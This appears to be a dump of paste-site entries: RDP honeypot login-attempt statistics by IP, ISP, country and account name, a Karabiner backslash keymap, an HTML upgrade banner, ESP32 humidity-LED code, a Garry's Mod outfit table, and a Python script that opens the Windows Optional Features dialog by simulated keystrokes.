    ""Singapore"": 1454,
    ""Iran"": 2,
    ""Mexico"": 2
  },
  ""account"": {
    ""hello"": 16,
    ""Domain"": 30,
    ""(empty)"": 8,
    ""yeQgJxOjr"": 2,
    ""aKJWKC"": 2,
    ""YDiBzJ"": 2,
    ""Administr"": 12,
    ""Administrator"": 212,
    ""pTsnsDfjz"": 2,
    ""Gsaznb"": 2,
    ""LvbeCO"": 2,
    ""ji5xjb6k"": 8,
    ""beio"": 2,
    ""Admin"": 208,
    ""Whatuptime.com"": 208,
    ""Jakartakini123#"": 208,
    ""Hello World"": 208,
    ""TinHocThucHanh"": 208,
    ""Hey"": 206,
    ""Test"": 10,
    ""gyhXZPxay"": 2,
    ""ZwhDsz"": 2,
    ""HufDEm"": 2,
    ""KuFOpCi"": 2,
    ""uNAmAgkcZ"": 2,
    ""vFxxvX"": 2,
    ""nDfwrd"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1570
  },
  ""client_build"": {
    ""Unknown"": 1570
  },
  ""client_name"": {
    ""Unknown"": 1570
  },
  ""ip_type"": {
    ""hosting"": 1506,
    ""Unknown"": 50,
    ""hosting & proxy"": 10,
    ""mobile"": 2,
    ""proxy"": 2
  }
}"
yEFvfDsh,2024-04-30_stats.json,rdp_snitch,JSON,Tuesday 30th of April 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""172.232.235.218"": 2,
    ""45.227.254.9"": 3,
    ""103.238.234.199"": 1,
    ""167.94.138.33"": 1,
    ""212.41.9.9"": 3,
    ""205.210.31.235"": 3,
    ""212.41.9.11"": 3,
    ""116.140.196.215"": 1,
    ""185.170.144.3"": 2,
    ""87.251.75.145"": 3,
    ""118.193.58.187"": 1,
    ""205.210.31.105"": 3,
    ""159.65.82.237"": 1,
    ""165.22.143.165"": 4,
    ""157.230.62.181"": 1,
    ""170.187.228.104"": 727,
    ""194.165.16.37"": 2,
    ""152.32.183.22"": 1,
    ""194.165.16.76"": 2,
    ""123.56.20.194"": 1,
    ""198.235.24.13"": 3,
    ""112.4.139.162"": 1,
    ""20.185.249.20"": 2,
    ""87.251.75.64"": 1,
    ""36.91.222.100"": 1,
    ""2.181.168.108"": 1,
    ""94.232.46.148"": 1,
    ""45.227.254.23"": 3,
    ""187.190.60.112"": 1,
    ""198.235.24.194"": 3,
    ""81.19.135.47"": 3
  },
  ""asn"": {
    ""AS63949"": 729,
    ""AS267784"": 6,
    ""AS140810"": 1,
    ""AS398324"": 1,
    ""AS49505"": 6,
    ""AS396982"": 12,
    ""AS4837"": 1,
    ""AS197414"": 2,
    ""AS208091"": 4,
    ""AS135377"": 2,
    ""AS14061"": 6,
    ""AS48721"": 4,
    ""AS37963"": 1,
    ""AS56046"": 1,
    ""AS8075"": 2,
    ""AS7713"": 1,
    ""AS58224"": 1,
    ""AS212482"": 1,
    ""AS22884"": 1,
    ""AS209588"": 3
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 729,
    ""Flyservers S.A."": 13,
    ""MAYTINHVPSTTT"": 1,
    ""Censys, Inc."": 1,
    ""OOO \""Network of data-centers \""Selectel\"""": 6,
    ""Google LLC"": 12,
    ""China Unicom CHINA169 Network"": 1,
    ""Xhost Internet Solutions LP"": 7,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""DigitalOcean, LLC"": 6,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Microsoft Corporation"": 2,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Iran Telecommunication Company PJS"": 1,
    ""Total Play Telecomunicaciones SA De CV"": 1
  },
  ""org"": {
    ""Akamai Technologies, Inc."": 2,
    ""UAB Host Baltic"": 6,
    ""Vpsttt Computer Company Limited"": 1,
    ""Censys, Inc"": 1,
    ""Unknown"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""China United Network Communications Corporation Limited"": 1,
    ""Xhostis"": 2,
    ""Xhost Internet Solutions"": 4,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 727,
    ""Flyservers S.A"": 4,
    ""Ucloud Information Technology"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Telekomunikasi Indonesia"": 1,
    ""tcsb DSL"": 1,
    ""Dmitriy Panchenko"": 1,
    ""Total Play Telecomunicaciones SA De CV"": 1,
    ""Alviva Holding Limited"": 3
  },
  ""regionName"": {
    ""Jakarta"": 3,
    ""Vilnius"": 6,
    ""Ho Chi Minh"": 1,
    ""Michigan"": 1,
    ""Moscow"": 6,
    ""California"": 16,
    ""Beijing"": 2,
    ""North Holland"": 6,
    ""Hesse"": 4,
    ""England"": 1,
    ""New Jersey"": 1,
    ""North West"": 727,
    ""Kaunas"": 4,
    ""Virginia"": 3,
    ""Jiangsu"": 1,
    ""Sistan and Baluchestan"": 1,
    ""Perm Krai"": 1,
    ""Hidalgo"": 1
  },
  ""country"": {
    ""Indonesia"": 3,
    ""Lithuania"": 10,
    ""Vietnam"": 1,
    ""United States"": 21,
    ""Russia"": 7,
    ""China"": 3,
    ""The Netherlands"": 6,
    ""Germany"": 4,
    ""United Kingdom"": 1,
    ""Singapore"": 727,
    ""Iran"": 1,
    ""Mexico"": 1
  },
  ""account"": {
    ""hello"": 8,
    ""Domain"": 15,
    ""(empty)"": 4,
    ""yeQgJxOjr"": 1,
    ""aKJWKC"": 1,
    ""YDiBzJ"": 1,
    ""Administr"": 6,
    ""Administrator"": 106,
    ""pTsnsDfjz"": 1,
    ""Gsaznb"": 1,
    ""LvbeCO"": 1,
    ""ji5xjb6k"": 4,
    ""beio"": 1,
    ""Admin"": 104,
    ""Whatuptime.com"": 104,
    ""Jakartakini123#"": 104,
    ""Hello World"": 104,
    ""TinHocThucHanh"": 104,
    ""Hey"": 103,
    ""Test"": 5,
    ""gyhXZPxay"": 1,
    ""ZwhDsz"": 1,
    ""HufDEm"": 1,
    ""KuFOpCi"": 1,
    ""uNAmAgkcZ"": 1,
    ""vFxxvX"": 1,
    ""nDfwrd"": 1
  },
  ""keyboard"": {
    ""Unknown"": 785
  },
  ""client_build"": {
    ""Unknown"": 785
  },
  ""client_name"": {
    ""Unknown"": 785
  },
  ""ip_type"": {
    ""hosting"": 753,
    ""Unknown"": 25,
    ""hosting & proxy"": 5,
    ""mobile"": 1,
    ""proxy"": 1
  }
}"
4JVpFuSw,como hacer un backslash con teclado eeuu y layout español,fabgonber,JSON,Tuesday 30th of April 2024 07:02:00 PM CDT,"/*
	si tienes un macbook de eeuu y utilizas layout en español se pierde el \ (backslash)
	esta complex_modification de karabiner-elements crea un \ al presionar SHIFT_IZQIERDO+OPT_DERECHO+7
	requieres instalar Karabiner-Elements (https://ke-complex-modifications.pqrs.org/)
*/
{
    ""description"": ""left_shift + right_option + 7 => back_slash "",
    ""manipulators"": [
        {
            ""from"": {
                ""key_code"": ""7"",
                ""modifiers"": {
                    ""mandatory"": [
                        ""left_shift""
                    ],
                    ""optional"": [
                        ""any""
                    ]
                }
            },
            ""to"": [
                {
                    ""key_code"": ""non_us_backslash"",
                    ""modifiers"": []
                }
            ],
            ""type"": ""basic""
        }
    ]
}"
64M5Vdhe,Jordan's Blog Upgrade Warning Box,TheiPhoneFan,HTML,Tuesday 30th of April 2024 07:01:48 PM CDT,"<!-- On 2024-04-30
Iframe Embed: 
<iframe src=""https://theiphonefan-beta.w3spaces.com/errors/upgrade-box.html"" style=""width:100%;height:235px;border-radius:16px;border-color:transparent;"" scrolling=""no""></iframe> 
-->
<!DOCTYPE html>
<html>
<head>
    <link href=""https://fonts.googleapis.com/css?family=Roboto:400,300,100,700,900"" rel=""stylesheet"" type=""text/css"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <style>
        body {
            background-color: #FF0F0F;
            border-radius: 16px;
            height: 215px;
        }
        .upgrade-box p {
            font-family: 'Roboto', sans-serif;
            font-size: 20px;
            font-weight: 300;
            color:white;
        }
        .upgrade-box a {
            text-decoration: underline;
            color: yellow;
        }
        .upgrade-box a:hover {
            text-decoration: none;
        }
        .flex-container {
            display: flex;
            flex-wrap: wrap;
        }
        .flex-container>div  /* Used to place content side-by-side. */  {
            padding: 10px;
            align-items: center;
            align-content: center;
        }
        @media (max-width: 620px) {
            img {
                display: none;
            }
        }
    </style>
</head>
<body>

<div class=""upgrade-box"">
    <div class=""flex-container"">
        <div>
            <a href=""https://jordansblog.net"" target=""_blank"">
                <img src=""https://i.ibb.co/BC6zGrs/critical-error.png"" width=""200"" style=""border-radius: 16px;"">
            </a>
        </div>
        <div>
            <p>This version of my website is out of date. 
            <br>Click <a href=""https://jordansblog.net"" target=""_blank"">here</a> to visit my new website 
            </p>
        </div>
    <div>
</div>

</body>
</html>"
74NtCg4e,ESP32 + DHT11 + RGB,Cam0uflage,C,Tuesday 30th of April 2024 06:46:24 PM CDT,"#include ""freertos/FreeRTOS.h""       // для vTaskDelay, pdMS_TO_TICKS, ESP_OK, ESP_FAIL и т.д.
#include ""esp_log.h""                 // для макроса ESP_LOGI
#include ""dht.h""                     // для функций работы с DHT


static const char *TAG = ""thsensor"";

#define DHT11_PIN   4
#define R_PIN       16
#define G_PIN       17
#define B_PIN       18
#define LOW         0
#define HIGH        1

void app_main(void)
{
    float humidity, temperature;
    float humidity_prev = 0.0f;

    gpio_reset_pin(R_PIN);
    gpio_set_direction(R_PIN, GPIO_MODE_OUTPUT);
    gpio_reset_pin(G_PIN);
    gpio_set_direction(G_PIN, GPIO_MODE_OUTPUT);
    gpio_reset_pin(B_PIN);
    gpio_set_direction(B_PIN, GPIO_MODE_OUTPUT);

    while (1)
    {
        if (dht_read_float_data(DHT_TYPE_DHT11, DHT11_PIN, &humidity, &temperature) == ESP_OK) {
            ESP_LOGI(TAG, ""Humidity: %.1f%% Temperature: %.1fC"", humidity, temperature);
            if (humidity != humidity_prev) {
                if (humidity < 40) {
                    gpio_set_level(R_PIN, LOW);
                    gpio_set_level(G_PIN, LOW);
                    gpio_set_level(B_PIN, LOW);

                    gpio_set_level(R_PIN, HIGH);
                }
                else if (humidity >= 40 && humidity <= 60) {
                    gpio_set_level(R_PIN, LOW);
                    gpio_set_level(G_PIN, LOW);
                    gpio_set_level(B_PIN, LOW);

                    gpio_set_level(G_PIN, HIGH);
                }
                else
                {
                    gpio_set_level(R_PIN, LOW);
                    gpio_set_level(G_PIN, LOW);
                    gpio_set_level(B_PIN, LOW);

                    gpio_set_level(B_PIN, HIGH);
                }
            }
            humidity_prev = humidity;
        }
        else
            ESP_LOGI(TAG, ""Could not read data from sensor"");
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
}"
4vLsFpFM,Diverge FoE Pins,Cleffy,Lua,Tuesday 30th of April 2024 06:35:53 PM CDT,"[1] = {
	[""children""] = {
		[1] = {
			[""children""] = {
				[1] = {
					[""children""] = {
					},
					[""self""] = {
						[""Skin""] = 0,
						[""UniqueID""] = ""e68ab54a71e166ca14553554e01244b3624393506f4627638259fc4eb0a7a375"",
						[""NoLighting""] = false,
						[""AimPartName""] = """",
						[""IgnoreZ""] = false,
						[""AimPartUID""] = """",
						[""Materials""] = """",
						[""Name""] = ""Frame"",
						[""LevelOfDetail""] = 0,
						[""NoTextureFiltering""] = false,
						[""PositionOffset""] = Vector(0, 0, 0),
						[""IsDisturbing""] = false,
						[""EyeAngles""] = false,
						[""DrawOrder""] = 0,
						[""TargetEntityUID""] = """",
						[""Alpha""] = 1,
						[""Material""] = ""models/gibs/metalgibs/metal_gibs"",
						[""Invert""] = false,
						[""ForceObjUrl""] = false,
						[""Bone""] = ""lrigpelvis"",
						[""Angles""] = Angle(0, 0, 0),
						[""AngleOffset""] = Angle(0, 0, 0),
						[""BoneMerge""] = false,
						[""Color""] = Vector(1, 1, 1),
						[""Position""] = Vector(-1.5, -6.5, 0),
						[""ClassName""] = ""model2"",
						[""Brightness""] = 1,
						[""Hide""] = false,
						[""NoCulling""] = false,
						[""Scale""] = Vector(0.30000001192093, 0.27000001072884, 0.11999999731779),
						[""LegacyTransform""] = false,
						[""EditorExpand""] = true,
						[""Size""] = 1,
						[""ModelModifiers""] = """",
						[""Translucent""] = false,
						[""BlendMode""] = """",
						[""EyeTargetUID""] = """",
						[""Model""] = ""models/props_phx/construct/wood/wood_wire1x2b.mdl"",
					},
				},
				[2] = {
					[""children""] = {
						[1] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""1c4fc8e18412b49890f98db1b61dbad44f9b09cb731413afe46b8335f00c6eb8"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""SPEAR 2"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, -90, 90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(0.274169921875, 3.177734375, 0.19859999418259),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.5,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVkxGdzdBOUpvTXBVa3pCP2U9RHlHcjgw/root/content"",
							},
						},
						[2] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""f6bf54f9d5bf90c7f125491af6462c129fbdf754327f079919ff04dee695c171"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""SPEAR 3"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, 90, -90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(-0.42579999566078, 8.2578125, 0.1988999992609),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.3,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVlIxcFZqZG8zOTVKX1pCP2U9Z0ZPQzRz/root/content"",
							},
						},
						[3] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""cbe4d5f7dc85176fa32a64a54b28e7f225955cbf76dace8f5215af33aadc48c7"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""Steel Rangers"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, 90, -90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(-4.1016998291016, 3.0567998886108, 0.19910000264645),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.5,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVnZnTkJGTjlySGkyT0RPP2U9Ymp3Sm9J/root/content"",
							},
						},
						[4] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""81e7b1936fb75bcc0c20b95053b33bbc6a59e530f055d6d7747befe85c43a574"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""NCR_noground"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, 90, -90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(-3.8805000782013, -2.1708984375, 0.20068359375),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.5,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVXB4LWp3dW5WVmx5UUpRP2U9YkdpUlk3/root/content"",
							},
						},
						[5] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""ad13e309fe0ba908da620713ad8fa9060108a8e560c4188ca2c452f7e0eb3ae0"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""Stable-Tec"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, -90, 90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(0.27430000901222, -8.1279001235962, 0.1988999992609),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.7,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVkJzdG1UakVXMUREdlBLP2U9cjhmendo/root/content"",
							},
						},
						[6] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""55fb353c5a7082b30032d141a32cc84c6920588eae54609cdc24f0b7de7cb341"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""SPEAR"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, -90, 90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(1.396484375, -2.048828125, 0.1982421875),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.5,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVXptN001c0laNFhLTE9kP2U9Tnp4UmhZ/root/content"",
							},
						},
						[7] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""d5593a1a62043abd4ab434efb61f753d1f9260c89f2e72a1d195f42949096e80"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""Enclave"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, 90, -90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(-4.3020000457764, 8.3325996398926, 0.29899999499321),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 3,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVTVkWXNOUi1wM01kV3hUP2U9MGlUb2tR/root/content"",
							},
						},
						[8] = {
							[""children""] = {
							},
							[""self""] = {
								[""Skin""] = 0,
								[""UniqueID""] = ""cfe3b395aea36331fbfc67957a2d650d015413e12e732f0959626762b4187317"",
								[""NoLighting""] = false,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""AimPartUID""] = """",
								[""Materials""] = """",
								[""Name""] = ""NCR"",
								[""LevelOfDetail""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""TargetEntityUID""] = """",
								[""Alpha""] = 1,
								[""Material""] = ""models/shiny"",
								[""Invert""] = true,
								[""ForceObjUrl""] = true,
								[""Bone""] = ""head"",
								[""Angles""] = Angle(0, 90, -90),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""BoneMerge""] = false,
								[""Color""] = Vector(1, 1, 1),
								[""Position""] = Vector(-3.9158000946045, -8, 0.19970703125),
								[""ClassName""] = ""model2"",
								[""Brightness""] = 1,
								[""Hide""] = false,
								[""NoCulling""] = false,
								[""Scale""] = Vector(1, 1, -1),
								[""LegacyTransform""] = false,
								[""EditorExpand""] = false,
								[""Size""] = 1.5,
								[""ModelModifiers""] = """",
								[""Translucent""] = false,
								[""BlendMode""] = """",
								[""EyeTargetUID""] = """",
								[""Model""] = ""objhttps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdXBmcnN1aGt5V2FuVmpUUDg4VXEzNXpiR3JtP2U9SlMzZmJQ/root/content"",
							},
						},
					},
					[""self""] = {
						[""DrawOrder""] = 0,
						[""UniqueID""] = ""cfaa58b3bde9f958642e9cf638c648ca7d829cc657f27797b483eaaa1dd77278"",
						[""Hide""] = false,
						[""TargetEntityUID""] = """",
						[""EditorExpand""] = true,
						[""OwnerName""] = ""self"",
						[""IsDisturbing""] = false,
						[""Name""] = ""Pins"",
						[""Duplicate""] = false,
						[""ClassName""] = ""group"",
					},
				},
			},
			[""self""] = {
				[""Skin""] = 0,
				[""UniqueID""] = ""18eb59159fc08c43ca89c919ef733993f8e84e996897d4e956bc938cf0e56109"",
				[""NoLighting""] = false,
				[""AimPartName""] = """",
				[""IgnoreZ""] = false,
				[""AimPartUID""] = """",
				[""Materials""] = """",
				[""Name""] = ""Showcase"",
				[""LevelOfDetail""] = 0,
				[""NoTextureFiltering""] = false,
				[""PositionOffset""] = Vector(0, 0, 0),
				[""IsDisturbing""] = false,
				[""EyeAngles""] = false,
				[""DrawOrder""] = 0,
				[""TargetEntityUID""] = """",
				[""Alpha""] = 1,
				[""Material""] = ""models/thundermountain_fx/wood_bridge001_vert"",
				[""Invert""] = false,
				[""ForceObjUrl""] = false,
				[""Bone""] = ""head"",
				[""Angles""] = Angle(45, 0, 0),
				[""AngleOffset""] = Angle(0, 0, 0),
				[""BoneMerge""] = false,
				[""Color""] = Vector(1, 1, 1),
				[""Position""] = Vector(25.200000762939, 0, 16),
				[""ClassName""] = ""model2"",
				[""Brightness""] = 1,
				[""Hide""] = false,
				[""NoCulling""] = false,
				[""Scale""] = Vector(1.0700000524521, 1.5, 0.050000000745058),
				[""LegacyTransform""] = false,
				[""EditorExpand""] = true,
				[""Size""] = 0.325,
				[""ModelModifiers""] = """",
				[""Translucent""] = false,
				[""BlendMode""] = """",
				[""EyeTargetUID""] = """",
				[""Model""] = ""models/hunter/plates/plate075x1.mdl"",
			},
		},
	},
	[""self""] = {
		[""DrawOrder""] = 0,
		[""UniqueID""] = ""1ddda7fa816c587481412d93cc3e5621f84a013d492145f8b0726d864c05d206"",
		[""Hide""] = false,
		[""TargetEntityUID""] = """",
		[""EditorExpand""] = true,
		[""OwnerName""] = ""self"",
		[""IsDisturbing""] = false,
		[""Name""] = ""FoE Pins"",
		[""Duplicate""] = false,
		[""ClassName""] = ""group"",
	},
},
"
hVhLVU86,open_optional_features,Python253,Python,Tuesday 30th of April 2024 06:35:43 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: open_optional_features.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script facilitates the opening of the ""Turn Windows features on or off"" dialog on Windows systems.
It does so by emulating key presses to navigate through the Windows Run dialog and enter the command to open the features dialog.

Requirements:
    - Python 3.x
    - Windows operating system

Usage:
    - Run the script in a Python environment compatible with the specified requirements.

Functions:
    - press_key(key): Simulates pressing a key using ctypes.
    - type_string(string): Simulates typing a string by pressing individual keys.
    - simulate_key_strokes(): Simulates key strokes to open the Run dialog and type 'optionalfeatures' to open the 'Turn Windows features on or off' dialog.

Additional Notes:
    - The script utilizes ctypes to interact with the Windows API and simulate key presses.
    - Ensure that the script is executed with the necessary permissions to emulate key presses and open system dialogs.
""""""

import subprocess
import os
import sys
import time
import ctypes

def press_key(key):
    """"""
    Simulate pressing a key using ctypes.
    
    Parameters:
        key (int): The virtual key code of the key to be pressed.
    """"""
    ctypes.windll.user32.keybd_event(key, 0, 0, 0)
    time.sleep(0.05)
    ctypes.windll.user32.keybd_event(key, 0, 2, 0)

def type_string(string):
    """"""
    Simulate typing a string by pressing individual keys.
    
    Parameters:
        string (str): The string to be typed.
    """"""
    for char in string:
        key_code = ord(char.upper())
        press_key(key_code)

def simulate_key_strokes():
    """"""
    Simulate key strokes to open the Run dialog and type 'optionalfeatures' to open the 'Turn Windows features on or off' dialog.
    """"""
    # Simulate pressing Win + R to open Run dialog
    press_key(0x5B)  # VK_LWIN
    press_key(0x52)  # 'R'
    type_string(""un"")  # Complete the simulated typing of ""run""
    
    # Hit Enter
    press_key(0x0D)  # 'Enter'

    time.sleep(0.5)  # Give time for Run dialog to appear

    # Simulate typing ""optionalfeatures""
    type_string(""optionalfeatures"")

    # Hit Enter
    press_key(0x0D)  # 'Enter'

if __name__ == ""__main__"":
    simulate_key_strokes()

"
